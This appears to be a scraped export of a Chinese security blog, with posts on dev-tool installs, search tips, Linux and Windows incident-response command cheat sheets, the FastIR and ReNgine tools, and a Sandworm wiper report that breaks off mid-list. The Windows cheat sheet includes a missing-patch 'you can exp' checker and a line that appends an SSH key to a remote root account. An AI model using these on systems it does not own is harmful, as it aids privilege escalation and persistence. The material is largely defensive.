-C ~/deploy/ -xzf go1.20.6.linux-amd64.tar.gzecho &#x27;export PATH=~/deploy/go/bin:$PATH&#x27; &gt;&gt; ~/.profile &amp;&amp; source ~/.profilego version## 国内镜像源安装第三方包,永久修改go env -w GO111MODULE=ongo env -w GOPROXY=https://goproxy.cn Linux NodeJS 一键安装 BASH 命令123456789wget https://nodejs.org/dist/v16.15.0/node-v16.15.0-linux-x64.tar.xztar -xJvf node-v16.15.0-linux-x64.tar.xz -C /usr/local/lib/nodejs echo &#x27;export PATH=/usr/local/lib/nodejs/node-v16.15.0-linux-x64/bin:$PATH&#x27; &gt;&gt; ~/.profile source ~/.profilenode -v # 国内镜像源 https://npmmirror.com/npm version npm config set registry https://registry.npm.taobao.org","tags":["编程环境","代码编程","自动化安装脚本","一键安装"],"categories":["程序编程"]},{"title":"一个突破搜索引擎的信息茧房方法","path":"/2023/07/11/break-through-infomation-gap/","content":"搜索引擎为我们提供了一个广阔的知识世界，通过基于关键词的搜索算法，帮助我们快速、准确地找到所需的信息，包括文章、新闻、图片、视频等各种类型的内容。所以我们要善于使用搜索引擎，帮助我们探索知识、寻找答案和解决问题，扩展自己的知识储备和理解世界。 突破搜索引擎的信息茧房在国内百度搜索的结果，大部分指向了CSDN、知乎等平台，个人感受是充斥着大量粘贴拷贝的内容，打开好几个链接，内容都差不多，而且内容编写也很简陋没有任何上下文，看了半天很难找到一篇高质量的内容。 于是想到，这些都是商业目的构建的信息茧房，把搜索结果圈起来赚流量的钱，并不是找到高质量结果为目的，所以一切就明了了，想要高质量就自己想办法吧。 具体指令如下： 搜索框输入：“搜索查询的内容” -site:zhihu.com -site:csdn.net -site:jianshu.com -site:cnblogs.com Github 关键词搜索工具Github是全球最大的程序员社区，里面不仅有代码，还有大量的优质文章， Sourcegraph 无需下载仓库到本地, 精确搜索定位找到我们所需的信息 Sourcegraph.com Sourcegraph 浏览器插件 Github官方搜索: https://github.com/search?type=code PASTEBIN: https://pastebin.com/ 世界主流的搜索引擎每个搜索引擎都有自己的局限性，可以换一个试试，突破信息差，可能有意想不到的结果。 Google.com 全球最大的搜索引擎，提供广泛、准确的搜索结果和丰富的服务 Bing.com 微软推出的搜索引擎，注重视觉设计和多媒体内容，并集成了实用工具 Yandex.com 俄罗斯最大的搜索引擎，提供多语言搜索和广泛的本地化服务 MetaGer 德国的隐私导向搜索引擎，不追踪用户行为，并提供可信赖的搜索结果 DuckDuckGo.com 致力于用户隐私的搜索引擎，不追踪用户个人信息，并提供匿名体验 OneSearch.com 由Verizon提供的隐私导向搜索引擎，保护用户隐私和提供透明的结果 Qwant.com 法国的隐私导向搜索引擎，不追踪用户行为，提供优质的搜索结果 Swisscows.com 瑞士的隐私导向搜索引擎，注重用户数据保护，AI技术提供精准的结果 Ecosia.org 使用广告收入支持树木种植的搜索引擎，每次搜索都能帮助环境保护 Lycos.com 早期知名的搜索引擎之一，提供广泛的网页搜索和门户服务 Soovle.com 多搜索引擎聚合工具，将多个搜索引擎的搜索结果整合在一个页面上 Dogpile 多搜索引擎聚合工具，整合多个搜索引擎的结果并提供综合的搜索体验 SearX 开源的元搜索引擎，整合多个搜索引擎的结果并提供匿名搜索体验 YaCy 一个完全去中心化、开放源代码的元搜索引擎 中文搜索[微信搜索]https://weixin.sogou.com/ 微信搜索 搜狗搜索 360搜索 知乎搜索 微博搜索 中文维基 法律搜索 wikiHow 万事指南 便捷搜索 虫部落快搜","tags":["Github","代码搜索","搜索工具","中文搜索"],"categories":["程序编程"]},{"title":"【推荐收藏】Linux 50+ 应急响应命令大全","path":"/2023/07/09/incident-response-linux-command-manual/","content":"我是数字安全极客，持续分享安全干货，点点关注不迷路！欢迎安全爱好者，加好友交流 微信：SecCMD | Twiter | 知乎 | GitHub 亲测收集整理！在安全应急响应中常用的操作命令。能够帮助工程师快速响应进行应急操作处置，帮助企业公司减少安全损失。在安全应急响应过程中需要使用系统命令进行止损和溯源网络攻击源头，但是命令太多容易忘记，上网现查又慢又累，不能快速阻止攻击，可能导致个人和企业的严重损失。 Linux 开机启动在操作系统中，分析查看开机启动信息。 典型场景：在应急响应过程中，排查可疑系统启动项，应即时禁用或者删除恶意系统启动项。 注意事项：需要联系系统管理员确认启动项是否合法，防止错误禁用和删除了正常的合法启动项。 Shell 命令行123456789101112131415161718192021# 查看开机启动项 :cat /etc/rc.local# 查看开机启动项文件 :ls /etc/profile.d/# SysV启动位置有：/etc/init/etc/init.d/etc/rc.d/etc/rc[0-6].d/etc/rc.local/etc/inittab# Systemd启动位置有：/etc/systemd~/.config/systemd/user# Xserver启动位置有：/etc/xdg/autostart~/.config/autostart Linux 防火墙在操作系统中，新建&#x2F;删除主机防火墙规则，禁用&#x2F;启用主机防火墙服务。 典型场景：在应急响应过程中，排查发现非法网络连接，通过防火墙快速阻断该地址和端口的通信，防止被持续控制。 注意事项：慎重操作防火墙拦截规则，防止错误防火墙规则导致网络完全中断。 IPTABLES 命令行123456789101112131415161718192021222324252627# 封堵远程地址 :iptables -I INPUT -s 10.10.10.0/24 -j DROP# 删除防火墙规则 :iptables -D INPUT -s 10.10.10.0/24 -j DROP# 封堵本地端口 :iptables -I INPUT -p tcp --dport 8080 -j DROP# 删除防火墙规则 :iptables -D INPUT -p tcp --dport 8080 -j DROP# 查看防火墙规则 :iptables -L# 清空防火墙规则 :iptables -F# Firewalld 防火墙 :service firewalld statusservice firewalld startservice firewalld stop# ufw 防火墙 :sudo ufw statussudo ufw enablesudo ufw disable Linux 系统日志在操作系统中，分析查看系统运行日志信息。 典型场景：在应急响应过程中，通过分析多个维度系统日志，溯源入侵攻击行为。 注意事项：确认日志时间是否正常，确认日志是否被删除或伪造。 Shell 命令行1234567891011121314# 系统安全日志 :/var/log/secure# 系统启动日志 :/var/log/boot.log# 用户登录日志 :/var/log/lastlog# 计划任务日志 :/var/log/cron# 程序执行、系统错误、启动信息等系统日志 :/var/log/messages Linux 网络连接在操作系统中，分析查看网络连接信息。 典型场景：在应急响应过程中，排查发现可疑网络连接，能够快速定位恶意进程。 注意事项：在大流量并发的服务器上，排查网络连接可能对性能会造成较严重影响。 Shell 命令行12345678910111213141516171819202122232425# 查找不常用的监听端口 :netstat -anpiftop# 运行的进程监听了端口 :lsof -ilsof -nPi tcp:443# 使用ss命令查看TCP协议：ss -anpt# 使用ss命令查看UDP协议：ss -anpu# 使用 tcpdump 分析：tcpdump -i &#123;网卡名&#125; host &#123;本地IP&#125; and udp port &#123;本地端口号&#125;# ARP表 :arp -a# 查找监听模式的网卡 :ip link | grep PROMISC# 提取所有活跃的连接 tcp ip$ netstat -ant |&amp; grep -Po &#x27;(\\d&#123;1,3&#125;\\.)&#123;3&#125;\\d&#123;1,3&#125;&#x27; | sort | grep -v 10.187.0 | uniq -c Linux 进程管理在操作系统中，关闭&#x2F;查看系统进程，删除&#x2F;新建系统服务。 典型场景：在应急响应过程中，排查发现可疑系统进程服务，应即时关闭恶意进程或者删除恶意服务，防止被持续控制。 注意事项：需要联系管理员确认进程服务是否为重要业务，防止错误关闭和删除了重要业务的进程服务。 Shell 命令行12345678910111213141516171819202122232425262728293031323334# 查看全部进程 :ps -aux || ps -ef# 定位高CPU占用的进程ps -eo cmd,pcpu,pid,user --sort -pcpu | head# 查看进程树pstree -sp &lt;PID&gt;# 关闭进程 :kill -9 &lt;PID&gt;# 给它 STOP 信号不让 cpu 切换到它，不直接 kill 掉它$ kill -STOP &lt;PID&gt;# 查看进程信息 :ls -al /proc/&lt;PID&gt;/fdls -al /proc/&lt;PID&gt;/execat /proc/&lt;PID&gt;/cmdline# 查看进程文件描述符 :lsof -p &lt;PID&gt;# 查看所有进程PID及运行命令perf top -s comm,pid# 跟踪进程执行时的系统调用和所接收的信号strace ls# 系统启动命令行也可能引入外部启动参数：cat /proc/cmdline# Nvidia显卡官方驱动自带命令看GPU占用情况：nvidia-smi -q -d utilization -l Linux 服务管理在操作系统中，关闭&#x2F;查看系统进程，删除&#x2F;新建系统服务。 典型场景：在应急响应过程中，排查发现可疑系统进程服务，应即时关闭恶意进程或者删除恶意服务，防止被持续控制。 注意事项：需要联系管理员确认进程服务是否为重要业务，防止错误关闭和删除了重要业务的进程服务。 Shell 命令行1234567891011121314151617181920212223242526272829303132333435# 查看全部服务 :systemctl# 查看服务运行状态 :systemctl status &lt;SERVICE_NAME&gt;# 关闭服务 :systemctl stop &lt;SERVICE_NAME&gt;# 启动服务 :systemctl start &lt;SERVICE_NAME&gt;# 环境变量systemctl set-environment testu=testmsystemctl show-environment# 查看全部服务的启动命令 :grep -R ExecStart /etc/systemd/system/*# 创建服务vi /etc/systemd/system/multi-user.target.wants/connection.service[Unit]Description = making network connection upAfter = network.target[Service]ExecStart = /root/scripts/conup.sh[Install]WantedBy = multi-user.targetsystemctl enable connection.servicesystemctl start connection.service Linux 计划任务在操作系统中，分析查看计划任务信息。 典型场景：在应急响应过程中，发现入侵者创建的异常计划任务，应即时禁用或者删除异常计划任务，防止被持续控制。 注意事项：需要联系系统管理员确认计划任务是否合法，防止错误禁用和删除了正常的计划任务。 Shell 命令行12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# Root用户定时任务 :crontab -u root -l# 系统定时任务 :cat /etc/crontabcat /etc/anacrontab# 查看计划任务文件 :ls -la /var/spool/cron/ls -la /var/spool/anacron/ls -la /var/spool/at/spool/# 系统定时任务文件 :$ find /etc/cron* -type f/etc/cron.d/sysstat/etc/cron.d/0hourly/etc/cron.daily/logrotate/etc/cron.daily/man-db.cron/etc/cron.deny/etc/cron.hourly/0anacron# atd 调度命令列表：at -l# systemd-timers 的位置在/etc/systemd子目录下：systemctl list-timerssystemctl list-unit-files | grep timer# 查看定时器systemctl list-timerssystemctl --user list-timersfind / -name apt-daily.timer/etc/systemd/system/timers.target.wants/apt-daily.timer/lib/systemd/system/apt-daily.timer# 创建定时器# Created a file at /etc/systemd/system/syncthing-monitoring.service[Unit]Description=Syncthing monitoring[Service]User=...Group=...Environment=&quot;TOKEN=...&quot;Environment=&quot;CHAT_ID=...&quot;Type=oneshotExecStart=/usr/bin/touch /tmp/foo# Created timer file at /etc/systemd/system/syncthing-monitoring.timer[Unit]Description=Syncthing monitoring[Timer]OnBootSec=5mOnUnitActiveSec=1h[Install]WantedBy=timers.target# The commands to enable/start the timer:sudo systemctl enable syncthing-monitoring.timersudo systemctl start syncthing-monitoring.timer# 创建临时定时器：systemd-run --on-active=1 /bin/touch /tmp/foo# 临时定时器保存目录，重启后清空 /run/systemd/transientRef: https://wiki.archlinuxcn.org/wiki/Systemd/%E5%AE%9A%E6%97%B6%E5%99%A8 Linux 用户账号在操作系统中，禁用&#x2F;启用&#x2F;删除&#x2F;新建一个账号。 典型场景：在应急响应过程中，发现入侵者创建的异常账号，快速禁用或者删除该账号，防止被再次利用。 注意事项：需要联系系统管理员确认账号是否合法，防止错误禁用和删除了正常的合法账号。 Shell 命令行1234567891011121314151617181920212223242526272829303132333435363738394041# 显示当前用户登录信息及执行的命令 :w# 查看当前登录用户（tty本地登陆 pts远程登录） :who# 列出所有用户登陆信息 :last# 列出所有用户登陆失败的信息 :lastb# 列出所有用户最近一次登录信息 :lastlog# 查看账户列表 :cat /etc/shadow# 修改账户密码 :passwd &lt;USERNAME&gt;# 禁用账户 :passwd -l &lt;USERNAME&gt;# 启用账户 :passwd -u &lt;USERNAME&gt;# 删除账户 :userdel &lt;USERNAME&gt;# 新建账户 :useradd &lt;USERNAME&gt;默认用户密钥位文件是否被篡改：cat ~/.ssh/authorized_keys攻击者增加其他密钥信任文件：grep AuthorizedKeysFile /etc/ssh/sshd_config# 查询 UID 为 0 的账号:egrep &#x27;:0+:&#x27; /etc/passwd 搜索被篡改或增加的系统文件123456789101112131415161718192021222324252627282930313233343536373839# Centos 系统：rpm -Va# Debian/Ubuntu 系统：apt install debsumsdpkg -l | awk &#x27;/^ii/ &#123; print $2 &#125;&#x27; | xargs debsums | grep -vE &#x27;OK$&#x27;# Usage: rpm [OPTION...]Query options (with -q or --query):Verify options (with -V or --verify):Query/Verify package selection options: -a, --all query/verify all packages -f, --file query/verify package(s) owning file -p, --package query/verify a package file -l, --list list files in package# 显示全部安装包$ rpm -qa# 验证全部安装包，显示丢失或被修改的文件$ rpm -qaVS – File size differsM – Mode differs (permissions)5 – MD5 sum differsD – Device number mismatchL – readLink path mismatchU – user ownership differsG – group ownership differsT – modification time differs# 验证安装包，哪些文件丢失或被修改$ rpm -V PACKAGE_NAME# 列出安装包包含的文件$ rpm -ql PACKAGE_NAME# 查询文件归属哪个安装包$ rpm -qf /path/to/file 环境变量123456789101112131415# 查看可疑动态加载的库文件cat /etc/ld.so.preloadls -alh /etc/ld.so.conf.d/ # 查看可疑环境变量：PATH/LD_LIBRARY_PATH/LD_PRELOAD/LD_AUDIT export |grep *.soenv | grep PATHenv | grep LD_# alias 命令查看当前所有命令别名：aliasset # 显示当前终端变量env # 显示用户环境变量export # 显示和设置用户环境变量 用户会话配置文件1234567891011121314151617181920212223# 系统配置文件位置有：/etc/profile/etc/profile.d/etc/environment/etc/bashrc# 用户目录配置文件有：~/.profile~/.bashrc~/.bash_profile~/.bash_logout~/.zshrc# X Window服务，配置文件：~/.xprofile~/.xinitrc# source 命令- source 命令用于在当前 shell 环境中执行指定脚本文件，并将其中的变量和函数导入到当前环境中。它通常用于加载脚本文件中的环境变量、别名和函数定义，以便在当前会话中可以直接使用它们。- 使用方法如下：source &lt;脚本文件路径&gt;- 或者可以使用其简写形式：. &lt;脚本文件路径&gt;- 注意，source 命令是在当前进程中执行脚本，而不是启动一个新的子进程。这意味着脚本文件中的变量和函数都会影响到当前的 shell 环境。- source 命令通常用于加载 shell 配置文件（如 ~/.bashrc 或 ~/.profile），以便立即生效，而不需要重新登录或启动新的终端会话。此外，它还可以用于加载其他自定义脚本文件，以便在当前会话中使用特定的环境设置或功能。 其他命令1234567891011121314151617181920212223242526272829303132# 查询过去 3 天内 /etc 被读取的文件find /etc -atime -3lsattr test.txt----ia---------- test.txtchattr -ia test.txtfind / -nouser -printLook for unusual SUID root files:# find / -uid 0 –perm -4000 –printThis requires knowledge of normal SUID files.Look for unusual large files (greater than 10MegaBytes):# find / -size +10000k –printThis requires knowledge of normal large files.Look for files named with dots and spaces (&quot;...&quot;, &quot;.. &quot;,&quot;. &quot;, and &quot; &quot;) used to camouflage files:# find / -name &quot; &quot; –print# find / -name &quot;.. &quot; –print# find / -name &quot;. &quot; –print# find / -name &quot; &quot; –print/etc/modprobe*/etc/modules*/etc/initcpio/etc/initramfs/etc/yum/etc/apt/etc/hosts Linux 应急工具在应急响应过程中，使用功能强大的应急工具箱。应急工具箱能够帮助我们，进行更深入全面的检测，发现可疑项。 Chkrootkit http://www.chkrootkit.org/ Tripwire http://www.tripwire.org/ AIDE http://www.cs.tut.fi/~rammer/aide.html CIS http://www.cisecurity.org/ Bastille http://www.bastille-linux.org/","tags":["HackTool"],"categories":["网络攻防"]},{"title":"【推荐收藏】Windows 60+ 应急响应命令大全","path":"/2023/07/09/incident-response-windows-command-manual/","content":"我是数字安全极客，持续分享安全干货，点点关注不迷路！欢迎安全爱好者，加好友交流 微信：SecCMD | Twiter | 知乎 | GitHub 亲测收集整理！在安全应急响应中常用的操作命令。能够帮助工程师快速响应进行应急操作处置，帮助企业公司减少安全损失。在安全应急响应过程中需要使用系统命令进行止损和溯源网络攻击源头，但是命令太多容易忘记，上网现查又慢又累，不能快速阻止攻击，可能导致个人和企业的严重损失。 Windows 开机启动在操作系统中，分析查看开机启动信息。 典型场景：在应急响应过程中，排查可疑系统启动项，应即时禁用或者删除恶意系统启动项。 注意事项：需要联系系统管理员确认启动项是否合法，防止错误禁用和删除了正常的合法启动项。 Powershell 命令行CMD 命令行12345678910# 查看开机启动项 :Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List# 查看开机启动项 :Get-psdrivecd HKLM:\\Set-location -path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersionGet-childitem -ErrorAction SilentlyContinue | Where-Object &#123;$_.Name -like &quot;*Run*&quot;&#125;Set-location -path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Get-childitem -ErrorAction SilentlyContinue | Where-Object &#123;$_.Name -like &quot;*Run*&quot;&#125;12345678# 查看开机启动项 :reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run# 查看开机启动项 :reg query HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run# WMIC 查看开机启动项 :wmic startup get caption,command Windows 防火墙在操作系统中，新建&#x2F;删除主机防火墙规则，禁用&#x2F;启用主机防火墙服务。 典型场景：在应急响应过程中，排查发现非法网络连接，快速通过防火墙阻断该地址和端口的通信，防止被持续控制。 注意事项：慎重操作防火墙拦截规则，防止错误防火墙规则导致网络完全中断。 Powershell 命令行CMD 命令行1234567891011121314151617181920212223# 封堵远程地址 :New-NetFirewallRule -DisplayName HuoZhu100 -Direction Inbound -Action Block -RemoteAddress 10.10.10.0/24# 封堵本地端口 :New-NetFirewallRule -DisplayName HuoZhu100 -Direction Inbound -Action Block -Protocol TCP -LocalPort 8080# 查看防火墙规则 :Get-NetFirewallRule -DisplayName HuoZhu100 # 查看防火墙规则 :Get-NetFirewallRule -DisplayName HuoZhu100 | Get-NetFirewallAddressFilter # 删除防火墙规则 :Remove-NetFirewallRule -DisplayName HuoZhu100 # 防火墙运行状态 :Get-NetFirewallProfile | Select-Object Name,Enabled# 开启防火墙 :Set-NetFirewallProfile -Enabled True# 关闭防火墙 :Set-NetFirewallProfile -Enabled False1234567891011121314151617181920# 封堵远程地址 :netpowershell advfirewall firewall add rule name=&quot;HuoZhu100&quot; dir=in action=block remoteip=10.10.10.0/24# 封堵本地端口 :netpowershell advfirewall firewall add rule name=&quot;HuoZhu100&quot; dir=in action=block protocol=TCP localport=8080# 查看防火墙规则 :netpowershell advfirewall firewall powershellow rule name=&quot;HuoZhu100&quot; # 删除防火墙规则 :netpowershell advfirewall firewall delete rule name=&quot;HuoZhu100&quot; # 防火墙运行状态 :netpowershell advfirewall powershellow currentprofile# 开启防火墙 :netpowershell advfirewall set allprofiles state on# 关闭防火墙 :netpowershell advfirewall set allprofiles state off Windows 系统日志在操作系统中，分析查看系统运行日志信息。 典型场景：在应急响应过程中，通过分析多个维度系统日志，溯源入侵攻击行为。 注意事项：确认日志时间是否正常，确认日志是否被删除或伪造。 Powershell 命令行CMD 命令行1234567891011121314151617# 查看日志清单 :Get-EventLog -List# 最近两个小时的安全日志 :Get-EventLog Security -After (Get-Date).AddHours(-2) | Format-Table -AutoSize# 最近两个小时登录成功的日志 :Get-EventLog Security -After (Get-Date).AddHours(-2) | Where-Object &#123;$_.InstanceID -like &quot;4624&quot;&#125;# 最近两个小时登录成功的详情 :Get-EventLog Security -After (Get-Date).AddHours(-2) | Where-Object &#123;$_.InstanceID -like &quot;4624&quot;&#125; | Format-List# 搜索指定系统日志 :Get-EventLog System -After (Get-Date).AddHours(-2) | Where-Object &#123;$_.Message -like &quot;*Server*&quot;&#125;# 最近两个小时的应用日志 :Get-EventLog Application -After (Get-Date).AddHours(-2) | Format-Table -AutoSize12# GUI 日志查看器 :eventvwr.msc Windows 网络连接在操作系统中，分析查看网络连接信息。 典型场景：在应急响应过程中，排查发现可疑网络连接，能够快速定位恶意进程。 注意事项：在大流量并发的服务器上，排查网络连接可能对性能会造成较严重影响。 Powershell 命令行CMD 命令行1234567# 查看网络连接 :Get-NetTCPConnection -LocalAddress 192.168.0.100 | Sort-Object LocalPort# 查看网络连接 :Get-NetTCPConnection -LocalAddress 192.168.0.100 `| Select local*,remote*,state,@&#123;Name=&quot;Process&quot;;Expression=&#123;(Get-Process -Id $_.OwningProcess).ProcessName&#125;&#125; `| Format-Table -AutoSize12# 查看网络连接 :netstat -ano Windows 进程管理在操作系统中，关闭&#x2F;查看系统进程，删除&#x2F;新建系统服务。 典型场景：在应急响应过程中，排查发现可疑系统进程服务，应即时关闭恶意进程或者删除恶意服务，防止被持续控制。 注意事项：需要联系管理员确认进程服务是否为重要业务，防止错误关闭和删除了重要业务的进程服务。 Powershell 命令行CMD 命令行12345# 查看全部进程 :Get-Process# 关闭进程 :Stop-Process -Force -ID &lt;PID&gt;12345678# 查看全部进程 :taskmgr.exe | tasklist.exe# 关闭进程 :taskkill.exe /f /pid &lt;PID&gt;# WMIC 查看全部进程 :wmic process get name,parentprocessid,processid Windows 服务管理在操作系统中，关闭&#x2F;查看系统进程，删除&#x2F;新建系统服务。 典型场景：在应急响应过程中，排查发现可疑系统进程服务，应即时关闭恶意进程或者删除恶意服务，防止被持续控制。 注意事项：需要联系管理员确认进程服务是否为重要业务，防止错误关闭和删除了重要业务的进程服务。 Powershell 命令行CMD 命令行12345678# 查看全部服务 :Get-Service# 关闭服务 :Stop-Service -Name &lt;SERVICE_NAME&gt;# 启动服务 :Start-Service -Name &lt;SERVICE_NAME&gt;12345678# 查看全部服务 :services.msc | sc query | tasklist /svc# 关闭服务 :net stop &lt;SERVICE_NAME&gt;# 启动服务 :net start &lt;SERVICE_NAME&gt; Windows 计划任务在操作系统中，分析查看计划任务信息。 典型场景：在应急响应过程中，发现入侵者创建的异常计划任务，应即时禁用或者删除异常计划任务，防止被持续控制。 注意事项：需要联系系统管理员确认计划任务是否合法，防止错误禁用和删除了正常的计划任务。 Powershell 命令行CMD 命令行1234567891011# 查看计划任务 :Get-ScheduledTask | Format-Table -AutoSize# 查看指定计划任务 :Get-ScheduledTask -TaskName Office* | Format-Table -AutoSize# 禁用计划任务 :Disable-ScheduledTask -taskname &quot;Adobe Flash Player Updater&quot;# 启用计划任务 :Enable-ScheduledTask -taskname &quot;Adobe Flash Player Updater&quot;12345678# 显示所有计划任务 :taskschd.msc | schtasks.exe /Query # 中止当前正在运行的计划任务 :schtasks.exe /End /TN \\Microsoft\\Windows\\NlaSvc\\WiFiTask# 删除计划任务 :schtasks.exe /Delete /F /TN \\Microsoft\\Windows\\NlaSvc\\WiFiTask Windows 用户账号在操作系统中，禁用&#x2F;启用&#x2F;删除&#x2F;新建一个账号。 典型场景：在应急响应过程中，发现入侵者创建的异常账号，快速禁用或者删除该账号，防止被再次利用。 注意事项：需要联系系统管理员确认账号是否合法，防止错误禁用和删除了正常的合法账号。 Powershell 命令行CMD 命令行1234567891011121314# 查看账户列表 :Get-LocalUser# 禁用账户 :Disable-LocalUser &lt;USERNAME&gt;# 启用账户 :Enable-LocalUser &lt;USERNAME&gt;# 删除账户 :Remove-LocalUser -Name &lt;USERNAME&gt;# 新建账户 :New-LocalUser -Name &lt;USERNAME&gt; -NoPassword1234567891011121314151617# CMD 查看账户列表 :net user# CMD 禁用账户 :net user &lt;USERNAME&gt; /active:no# CMD 启用账户 :net user &lt;USERNAME&gt; /active:yes# CMD 删除账户 :net user &lt;USERNAME&gt; /del# CMD 新建账户 :net user &lt;USERNAME&gt; &lt;PASSWORD&gt; /add# CMD 修改账户密码 :net user &lt;USERNAME&gt; &lt;PASSWORD&gt; Windows 应急工具在应急响应过程中，使用功能强大的应急工具箱。 应急工具箱能够帮助我们，进行更深入全面的检测，发现可疑项。 Sysinternals (Psexec ProcessMonitor Sysmon) https://docs.microsoft.com/en-us/sysinternals/downloads/ Process Hacker http://processhacker.sourceforge.net AutoRuns 是一款项目管理工具，查看资源管理器、IE浏览器、计划任务、驱动等信息 https://filehippo.com/zh/download_autoruns PC Hunter 是一个Windows系统信息查看软件，同时也是一个手工杀毒辅助软件 http://www.xuetr.com/ PowerTool 是一款手工杀毒辅助，进程管理辅助工具 https://www.portablesoft.org/ Process Lasso也是一款优秀的进程管理辅助工具，它同时可以监视进程动作 http://www.processlassopro.com/ 火绒剑 是一款优秀的进程管理分析工具 http://down4.huorong.cn/hrsword.exe Windows系统安全登录日志分析工具 https://github.com/TheKingOfDuck/logonTracer Windows 命令探索1234567891011121314dsquery server # 查看所有域控制器 dsquery subnet # 查看域内内子网 dsquery group # 查看域内工作组 dsquery site # 查看域内站点 net time /domain # 查看域名、时间net view /domain # 查看域内所有共享# 快速查找未打的安全补丁 systeminfo&gt;bzhack.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i &quot;%i&quot;|| @echo %i you can exp)&amp;del /f /q /a bzhack.txt# PowerShell 快速上传SSH密钥type $env:USERPROFILE\\.ssh\\id_rsa.pub | ssh root@1.1.1.1 &quot;cat &gt;&gt; .ssh/authorized_keys&quot;","tags":["HackTool"],"categories":["网络攻防"]},{"title":"FastIR Collector - Windows 事件响应工具","path":"/2023/07/08/fastir-collector-windows-incident/","content":"FastIR Collector是一个Windows下的信息收集工具，该工具收集实时 Windows 上的信息包括：内存，注册表，文件信息等并将结果记录在 csv 文件中。通过对这些信息的分析，可以及时发现入侵痕迹。 执行12345./fastIR_x64.exe -h 帮助./fastIR_x64.exe --packages fast 提取所有工件，除了 Dump 和 FileCatcher 包./fastIR_x64.exe --packages dump --dump mft提取MFT./fastIR_x64.exe --packages all --output_dir output_dir 设置目录输出（默认./output/）./fastIR_x64.exe --profile you_file_profile 设置提取配置文件。 功能 文件系统 IE&#x2F;Firefox&#x2F;Chrome 历史记录 IE&#x2F;Firefox&#x2F;Chrome 下载 命名管道 预取 回收站 启动目录 运行状态 ARP表 驱动器列表 网络驱动器 网卡 进程 路由表 任务 计划工作 服务 会话 网络共享 网络连接 注册表 安装程序文件夹 OpenSaveMRU 最近的文档 服务 Shellbags 自动运行 USB历史 UserAssists 网络列表 内存信息 剪贴板 加载的 DLL 打开的文件 Dump MFT MBR 内存 磁盘 注册表 SAM FileCatcher Based on mime type Define path and depth to filter the search Possibility to filter your search Yara Rules 完整的文档可以在这里下载：帮助手册 Github","tags":["HackTool"],"categories":["网络攻防"]},{"title":"ReNgine – 自动化侦察框架","path":"/2023/07/08/rengine/","content":"ReNgine – 自动侦察每次开始我们的安全扫描和侦察，都要了解目标托管在哪里，运行的是什么服务，开放的端口等等。手动完成这些操作可能非常耗时，更不用说组织所有这些数据的痛苦了。幸运的是，ReNgine 能够帮助我们做到了所有这些。让我们来看看这个神奇的工具！ ReNgine 是什么？ReNgine是一个针对Web应用程序的自动侦察工具，让您更轻松地发现漏洞和安全问题。它帮助您建立攻击路径或简化整个侦察过程，让您的工作更高效。 引擎驱动：ReNgine 可以执行各种任务引擎，比如查找子域名、漏洞扫描等，帮助您发现潜在的弱点和漏洞。 数据管理与备份：所有收集到的数据都会被整理并备份到数据库中，您可以随时访问之前的扫描结果，轻松对比和分析数据。 持续监控：您可以设置定期扫描来持续监控目标。ReNgine 会自动检测目标基础设施的变化，并及时提醒您。这样，您就可以快速了解新出现的漏洞和风险。 用户界面友好：ReNgine 提供了一个易于使用的用户界面(UI)，让您可以直接与数据进行交互，轻松地查看和分析所有关键信息。 ReNgine 部署1.下载代码库，到新创建的目录中： git clone https://github.com/yogeshojha/rengine &amp;&amp; cd rengine 2.编辑环境文件： nano .env 请注意修改 postgresql 的默认密码。 3.运行初始化脚本： sudo ./install.sh 该脚本将安装、设置并启动 ReNgine 运行所需的所有 docker 容器。 安装完成后，程序会提示输入用户名和密码，需要用它来登录管理后台。 4.前往 https://127.0.0.1 访问管理后台！ 我们的第一次扫描让我们进行第一次扫描！ ** 第 1 步：创建目标 ** 转到目标选项卡并添加新目标。输入域名和描述（如果需要）。 这将使您看到以下视图，您可以在其中清楚地看到我们以前从未扫描过该目标。让我们改变这一点！ ** 第 2 步：执行第一次扫描 ** 单击目标旁边的闪电图标以启动扫描。您将被重定向到一个页面，您可以在其中选择要在目标上运行的引擎。在本例中，我想执行子域扫描，因此我选择了该扫描。 我没有时间深入介绍每一个功能，但是这个功能真的非常非常酷。子域是否超出范围？不用担心，只要在这里列出它们就不会被扫描！ ** 第 3 步：评估结果 ** 扫描完成后，您可以查看所有结果。请注意，在本例中，我只运行了子域扫描，但是该工具可以做更多事情！ ReNgine 更多功能ReNgine 提供的更多功能 端口发现 端点发现 目录爆破 使用 Nuclei 进行漏洞扫描 并行扫描 数据可视化 可配置的扫描引擎 开源情报能力 对即时通讯工具发出警报 待办事项清单 代理支持 如需更详细的解释，请查看 GitHub ：https://github.com/yogeshojha/rengine","tags":["开源项目","安全产品","漏洞扫描"],"categories":["网络攻防"]},{"title":"“沙虫”黑客组织使用WinRAR擦除乌克兰国家机构的数据","path":"/2023/06/08/apt/apt-2023-06-08/","content":"背景安天微博：乌克兰政府计算机应急响应小组(CERT-UA)表示，俄罗斯黑客使用未受多因素身份验证保护的VPN帐户访问乌克兰国家网络中的关键系统。一旦获得网络访问权，他们就会使用脚本来使用WinRAR压缩软件擦除Windows和Linux机器上的文件。在Windows上，“沙虫”使用的BAT脚本是“RoarBat”，它会在磁盘和特定目录中搜索文件类型，例如doc、docx、rtf、txt、xls、xlsx、ppt、pptx、vsd、vsdx、pdf、png、jpeg、jpg、zip、rar、7z、mp4、sql、php、vbk、vib、vrb、p7s、sys、dll、exe、bin和dat，并使用WinRAR程序将它们压缩。 原文：https://weibo.cn/sinaurl?u=https%3A%2F%2Fcert.gov.ua%2Farticle%2F4501891 攻击过程 a.入口点：俄罗斯黑客使用未受多因素身份验证保护的VPN帐户访问乌克兰国家网络中的关键系统。 b.执行：恶意脚本是使用计划任务启动的，根据初步信息，该任务由组策略 （GPO） 创建和集中分发。??? 具体实现 ??? c.运行 Windows 的计算机：使用了 BAT 脚本 c1.它会在磁盘和特定目录中搜索文件类型 (.doc, .docx, .rtf, .txt, .xls, .xlsx, .ppt, .pptx, .vsd, .vsdx, .pdf, .png, 